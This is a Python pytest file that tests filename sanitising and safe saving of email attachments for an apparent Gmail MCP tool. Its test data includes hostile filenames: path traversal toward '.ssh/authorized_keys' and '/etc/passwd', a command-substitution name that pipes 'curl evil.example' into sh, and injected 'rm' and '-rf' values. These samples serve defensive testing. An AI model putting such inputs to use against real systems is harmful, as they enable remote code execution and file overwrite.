import stat
from pathlib import Path

import pytest

from google_personal_mcp.gmail.attachments import (
    MAX_COLLISION_TRIES,
    MAX_FILENAME_BYTES,
    MAX_FILENAME_LENGTH,
    ensure_inside,
    sanitize_filename,
    save_attachment,
)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("report.pdf", "report.pdf"),
        ("../../.ssh/authorized_keys", "authorized_keys"),
        ("/etc/passwd", "passwd"),
        ("C:\\Users\\x\\evil.exe", "evil.exe"),
        ("..", "fallback"),
        ("", "fallback"),
        (".hidden", "hidden"),
        ("a\x00b\nc.txt", "abc.txt"),
        ("dir/", "fallback"),
        (". .hidden", "hidden"),
        (". .", "fallback"),
        (".  ..", "fallback"),
        (" . .bashrc", "bashrc"),
        ("a\u202eb\u2028c\u2029d.txt", "abcd.txt"),
        # Shell metacharacters become "_": the returned path is likely to end up in a shell command.
        ("$(curl -s evil.example|sh).pdf", "_(curl -s evil.example_sh).pdf"),
        ("`id`.pdf", "_id_.pdf"),
        ('a"; rm x; ".pdf', "a__ rm x_ _.pdf"),
        ("a<b>c&d'e.txt", "a_b_c_d_e.txt"),
        ("*?[x]{y}!#%^:.txt", "___x__y______.txt"),
        ("~root.txt", "_root.txt"),
        # A leading "-" would read as a command option.
        ("-rf", "_-rf"),
        ("--help.pdf", "_--help.pdf"),
        # Ordinary names, accents and other scripts are kept.
        ("Informe a\u00f1o 2026 (1).pdf", "Informe a\u00f1o 2026 (1).pdf"),
        ("a+b=c,d@e_f-g.txt", "a+b=c,d@e_f-g.txt"),
        ("\u8acb\u6c42\u66f8 \u20ac.pdf", "\u8acb\u6c42\u66f8 \u20ac.pdf"),
    ],
)
def test_sanitize(raw, expected):
    assert sanitize_filename(raw, fallback="fallback") == expected


def test_long_name_capped_keeps_extension():
    name = sanitize_filename("x" * 300 + ".pdf", fallback="f")
    assert len(name) <= MAX_FILENAME_LENGTH == 150
    assert name.endswith(".pdf")


def test_save_never_overwrites(tmp_path):
    p1 = save_attachment(b"1", "a.txt", tmp_path / "dl", fallback="f")
    p2 = save_attachment(b"2", "a.txt", tmp_path / "dl", fallback="f")
    assert p1.name == "a.txt"
    assert p2.name == "a-1.txt"
    assert p1.read_bytes() == b"1"
    assert p2.read_bytes() == b"2"


def test_save_permissions(tmp_path):
    path = save_attachment(b"data", "a.txt", tmp_path / "nested" / "dl", fallback="f")
    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    assert stat.S_IMODE(path.parent.stat().st_mode) == 0o700


def test_existing_symlink_is_not_followed(tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_bytes(b"secret")
    download_dir = tmp_path / "dl"
    download_dir.mkdir()
    (download_dir / "a.txt").symlink_to(outside)
    path = save_attachment(b"new", "a.txt", download_dir, fallback="f")
    assert path == download_dir / "a-1.txt"
    assert path.read_bytes() == b"new"
    assert outside.read_bytes() == b"secret"


def test_dangling_symlink_is_not_followed(tmp_path):
    download_dir = tmp_path / "dl"
    download_dir.mkdir()
    target = tmp_path / "not-created.txt"
    (download_dir / "a.txt").symlink_to(target)
    path = save_attachment(b"new", "a.txt", download_dir, fallback="f")
    assert path.name == "a-1.txt"
    assert not target.exists()


def test_large_payload_written_completely(tmp_path):
    data = b"z" * 5_000_000
    assert save_attachment(data, "big.bin", tmp_path, fallback="f").read_bytes() == data


def test_ensure_inside_rejects_other_directory(tmp_path):
    download_dir = tmp_path / "dl"
    download_dir.mkdir()
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (download_dir / "link").symlink_to(elsewhere)
    ensure_inside(download_dir / "ok.txt", download_dir)
    with pytest.raises(ValueError, match="outside"):
        ensure_inside(download_dir / "link" / "x.txt", download_dir)


def test_collision_loop_gives_up(tmp_path, monkeypatch):
    assert MAX_COLLISION_TRIES == 1000
    monkeypatch.setattr("google_personal_mcp.gmail.attachments.MAX_COLLISION_TRIES", 3)
    for _ in range(4):
        save_attachment(b"x", "a.txt", tmp_path, fallback="f")
    with pytest.raises(ValueError, match="free name"):
        save_attachment(b"x", "a.txt", tmp_path, fallback="f")
    assert sorted(p.name for p in tmp_path.iterdir()) == ["a-1.txt", "a-2.txt", "a-3.txt", "a.txt"]


def test_hostile_name_stays_inside(tmp_path):
    path = save_attachment(b"x", "../../evil.sh", tmp_path / "dl", fallback="f")
    assert path == tmp_path / "dl" / "evil.sh"
    assert sorted(p.name for p in tmp_path.iterdir()) == ["dl"]
    assert [p.name for p in (tmp_path / "dl").iterdir()] == ["evil.sh"]


def test_emoji_name_fits_byte_cap_and_saves(tmp_path):
    name = sanitize_filename("\U0001f600" * 146 + ".pdf", fallback="f")
    assert len(name.encode()) <= MAX_FILENAME_BYTES
    assert name.endswith(".pdf")
    assert name.removesuffix(".pdf") == "\U0001f600" * (len(name) - 4)
    path = save_attachment(b"x", "\U0001f600" * 146 + ".pdf", tmp_path, fallback="f")
    assert path.read_bytes() == b"x"


def test_cleanup_when_inside_check_fails(tmp_path, monkeypatch):
    def refuse(path, download_dir):
        raise ValueError("outside")

    monkeypatch.setattr("google_personal_mcp.gmail.attachments.ensure_inside", refuse)
    with pytest.raises(ValueError, match="outside"):
        save_attachment(b"x", "a.txt", tmp_path / "dl", fallback="f")
    assert list((tmp_path / "dl").iterdir()) == []


def test_relative_download_dir_gives_absolute_path(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    path = save_attachment(b"x", "a.txt", Path("rel"), fallback="f")
    assert path.is_absolute()
    assert path == tmp_path.resolve() / "rel" / "a.txt" or path == tmp_path / "rel" / "a.txt"
